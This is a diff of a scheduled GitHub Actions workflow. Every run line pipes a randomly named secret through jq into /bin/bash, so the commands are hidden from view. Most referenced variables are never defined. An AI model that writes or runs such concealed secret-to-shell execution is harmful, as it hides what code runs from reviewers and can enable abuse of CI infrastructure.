@@ -3,25 +3,19 @@ name: chenmeijiao2010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 0/6 * * *'
-
+    - cron: '27 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chenmeijiao2010
         env:
-          ixqm0804: ${{ secrets.ixqm0804 }}
+          nsht6000: ${{ secrets.nsht6000 }}
         run: |
-          echo $ixqm0804 | jq -r .sc07 | /bin/bash
-          echo $bxqc7696 | jq -r .d99 | /bin/bash
-          echo $zxlm0846 | jq -r .t4119 | /bin/bash
-          echo $lr08974 | jq -r .gw39 | /bin/bash
-          echo $nal601 | jq -r .nzox8307 | /bin/bash
-          echo $swki16912 | jq -r .qsuhb41 | /bin/bash
-          echo $qq39 | jq -r .bwl88 | /bin/bash
-          echo $nlann9891 | jq -r .csuxb5 | /bin/bash
-          echo $kfotx5827 | jq -r .jt2468 | /bin/bash
+          echo $nsht6000 | jq -r .ka149 | /bin/bash
+          echo $esave14379 | jq -r .zvd1291 | /bin/bash
+          echo $suu326 | jq -r .g2 | /bin/bash
+          echo $zvyyh9 | jq -r .kssr966 | /bin/bash
+          echo $izu3 | jq -r .z38 | /bin/bash
 
